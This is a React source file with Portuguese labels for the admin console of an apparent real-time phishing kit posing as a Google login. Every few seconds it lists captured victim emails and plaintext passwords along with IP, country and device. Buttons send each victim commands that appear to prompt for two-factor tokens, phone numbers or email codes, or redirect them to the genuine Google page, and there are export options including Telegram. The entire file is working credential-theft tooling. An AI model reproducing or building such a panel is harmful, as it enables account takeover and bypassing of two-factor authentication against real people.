import { useState, useEffect } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

function AdminPanel() {
  const [loginAttempts, setLoginAttempts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [redirectUrl, setRedirectUrl] = useState("https://business.google.com/");
  const navigate = useNavigate();

  useEffect(() => {
    fetchLoginAttempts();
    const interval = setInterval(fetchLoginAttempts, 3000); // Atualiza a cada 3 segundos
    return () => clearInterval(interval);
  }, []);

  const getAuthHeaders = () => {
    const token = localStorage.getItem("admin_token");
    if (!token) {
      navigate("/donas/login");
      return null;
    }
    return { Authorization: `Bearer ${token}` };
  };

  const fetchLoginAttempts = async () => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      const response = await axios.get(`${API}/admin/login-attempts`, { headers });
      setLoginAttempts(response.data);
      setLoading(false);
    } catch (error) {
      console.error("Erro ao buscar tentativas:", error);
      if (error.response?.status === 401) {
        localStorage.removeItem("admin_token");
        navigate("/donas/login");
      }
    }
  };

  const sendCommand = async (userId, command) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      const payload = {
        user_id: userId,
        command: command,
      };

      if (command === "REDIRECT") {
        payload.redirect_url = redirectUrl;
      }

      await axios.post(`${API}/admin/command`, payload, { headers });
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao enviar comando:", error);
    }
  };

  const updateStatus = async (userId, status) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.post(`${API}/admin/update-status/${userId}?status=${status}`, {}, { headers });
      fetchLoginAttempts();
    } catch (error) {
      console.error("Erro ao atualizar status:", error);
    }
  };

  const handleDelete = async (id) => {
    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.delete(`${API}/admin/login-attempts/${id}`, { headers });
      setLoginAttempts(loginAttempts.filter((a) => a.id !== id));
    } catch (error) {
      console.error("Erro ao deletar:", error);
    }
  };

  const handleClearAll = async () => {
    if (!window.confirm("Tem certeza que deseja limpar todas as tentativas?")) {
      return;
    }

    try {
      const headers = getAuthHeaders();
      if (!headers) return;

      await axios.post(`${API}/admin/clear-all`, {}, { headers });
      setLoginAttempts([]);
    } catch (error) {
      console.error("Erro ao limpar:", error);
    }
  };

  const handleLogout = () => {
    localStorage.removeItem("admin_token");
    navigate("/donas/login");
  };

  const filteredAttempts = loginAttempts.filter((attempt) =>
    attempt.email.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-gradient-to-r from-purple-600 to-purple-700 shadow-lg">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between flex-wrap gap-4">
            <div className="flex items-center gap-2 flex-wrap">
              <button className="bg-orange-500 hover:bg-orange-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
                TXT
              </button>
              <button className="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
                PDF
              </button>
              <button className="bg-blue-400 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
                Telegram
              </button>
              <button
                onClick={handleClearAll}
                className="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors"
              >
                Limpar Tudo
              </button>
              <button
                onClick={fetchLoginAttempts}
                className="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors"
              >
                Atualizar
              </button>
              <button className="bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
                Exibir Visitantes
              </button>
            </div>
            <div className="flex items-center gap-3">
              <img
                src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
                alt="Google"
                className="h-8"
              />
              <button
                onClick={handleLogout}
                className="bg-white text-purple-600 px-4 py-2 rounded text-sm font-medium hover:bg-gray-100 transition-colors"
              >
                Sair
              </button>
              <button className="bg-yellow-400 text-black px-4 py-2 rounded text-sm font-bold hover:bg-yellow-500 transition-colors">
                DONAS
              </button>
            </div>
          </div>
        </div>
      </header>

      {/* Content */}
      <div className="container mx-auto px-4 py-8">
        <div className="bg-white rounded-lg shadow-md p-6">
          <h1 className="text-2xl font-bold text-gray-900 mb-6">
            Tentativas de Login ({filteredAttempts.length})
          </h1>

          {/* Search */}
          <div className="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Campo de referência (ex: email...):
              </label>
              <input
                type="text"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder="Pesquisar..."
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Site de Redirecionamento (Comando X):
              </label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={redirectUrl}
                  onChange={(e) => setRedirectUrl(e.target.value)}
                  placeholder="https://business.google.com/"
                  className="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                />
              </div>
            </div>
          </div>

          {/* Cards */}
          {loading ? (
            <div className="text-center py-12">
              <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-purple-600"></div>
              <p className="mt-4 text-gray-600">Carregando...</p>
            </div>
          ) : filteredAttempts.length === 0 ? (
            <div className="text-center py-12">
              <p className="text-gray-500 text-lg">Nenhuma tentativa de login encontrada</p>
            </div>
          ) : (
            <div className="space-y-4">
              {filteredAttempts.map((attempt, index) => (
                <div key={attempt.id} className="border border-gray-200 rounded-lg p-4 bg-white shadow-sm hover:shadow-md transition-shadow">
                  {/* Header do Card */}
                  <div className="grid grid-cols-2 sm:grid-cols-4 md:grid-cols-6 lg:grid-cols-12 gap-2 mb-4">
                    {/* # */}
                    <div className="flex flex-col">
                      <span className="text-xs font-semibold text-blue-600 mb-1">#</span>
                      <span className="text-sm font-bold">{index + 1}</span>
                    </div>

                    {/* STATUS */}
                    <div className="flex flex-col">
                      <span className="text-xs font-semibold text-purple-600 mb-1">STATUS</span>
                      <button
                        onClick={() => updateStatus(attempt.id, attempt.status === "online" ? "offline" : "online")}
                        className="flex items-center gap-1"
                      >
                        <span className={`inline-block w-3 h-3 rounded-full ${attempt.status === "online" ? "bg-green-500" : "bg-red-500"}`}></span>
                        <span className="text-xs">{attempt.status === "online" ? "ON" : "OFF"}</span>
                      </button>
                    </div>

                    {/* INV */}
                    <div className="flex flex-col">
                      <span className="text-xs font-semibold text-yellow-600 mb-1">INV</span>
                      <button
                        onClick={() => sendCommand(attempt.id, "INV")}
                        className="bg-yellow-500 hover:bg-yellow-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
                      >
                        INV
                      </button>
                    </div>

                    {/* USUÁRIO/LOGIN */}
                    <div className="flex flex-col col-span-2">
                      <span className="text-xs font-semibold text-green-600 mb-1">USUÁRIO/LOGIN</span>
                      <span className="text-sm font-medium truncate">{attempt.email}</span>
                    </div>

                    {/* SENHA */}
                    <div className="flex flex-col">
                      <span className="text-xs font-semibold text-pink-600 mb-1">SENHA</span>
                      <span className="text-sm truncate">{attempt.password || "-"}</span>
                    </div>

                    {/* AUT */}
                    <div className="flex flex-col">
                      <span className="text-xs font-semibold text-blue-600 mb-1">AUT</span>
                      <button
                        onClick={() => sendCommand(attempt.id, "AUT")}
                        className="bg-blue-500 hover:bg-blue-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
                      >
                        AUT
                      </button>
                    </div>

                    {/* EMAIL */}
                    <div className="flex flex-col">
                      <span className="text-xs font-semibold text-indigo-600 mb-1">EMAIL</span>
                      <button
                        onClick={() => sendCommand(attempt.id, "EMAIL")}
                        className="bg-indigo-500 hover:bg-indigo-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
                      >
                        EMAIL
                      </button>
                    </div>

                    {/* TOK-TEL */}
                    <div className="flex flex-col">
                      <span className="text-xs font-semibold text-teal-600 mb-1">TOK-TEL</span>
                      <button
                        onClick={() => sendCommand(attempt.id, "TOK-TEL")}
                        className="bg-teal-500 hover:bg-teal-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
                      >
                        TOK
                      </button>
                    </div>

                    {/* Nº TELEFONE */}
                    <div className="flex flex-col">
                      <span className="text-xs font-semibold text-orange-600 mb-1">Nº TEL</span>
                      <button
                        onClick={() => sendCommand(attempt.id, "TELEFONE")}
                        className="bg-orange-500 hover:bg-orange-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
                      >
                        TEL
                      </button>
                    </div>

                    {/* 👍 */}
                    <div className="flex flex-col">
                      <span className="text-xs font-semibold text-gray-600 mb-1">AGUARDE</span>
                      <button
                        onClick={() => sendCommand(attempt.id, "AGUARDE")}
                        className="bg-gray-500 hover:bg-gray-600 text-white px-2 py-1 rounded text-xs transition-colors"
                      >
                        👍
                      </button>
                    </div>

                    {/* X */}
                    <div className="flex flex-col">
                      <span className="text-xs font-semibold text-red-600 mb-1">X</span>
                      <button
                        onClick={() => sendCommand(attempt.id, "REDIRECT")}
                        className="bg-red-500 hover:bg-red-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors"
                      >
                        X
                      </button>
                    </div>
                  </div>

                  {/* Informações abaixo */}
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-3 pt-3 border-t border-gray-200 text-xs text-gray-600">
                    <div>
                      <span className="font-semibold">🌐 IP:</span> {attempt.ip_address || "-"}
                    </div>
                    <div>
                      <span className="font-semibold">🌍 País:</span> {attempt.country || "-"}
                    </div>
                    <div>
                      <span className="font-semibold">💻 Dispositivo:</span> {attempt.device || "Desktop"}
                    </div>
                    <div>
                      <span className="font-semibold">📄 Página atual:</span> {attempt.page || "Página Loading..."}
                    </div>
                  </div>

                  {/* Botão deletar */}
                  <div className="mt-3 pt-3 border-t border-gray-200 flex justify-end">
                    <button
                      onClick={() => handleDelete(attempt.id)}
                      className="text-red-600 hover:text-red-800 font-bold transition-colors"
                    >
                      🗑️ Deletar
                    </button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default AdminPanel;
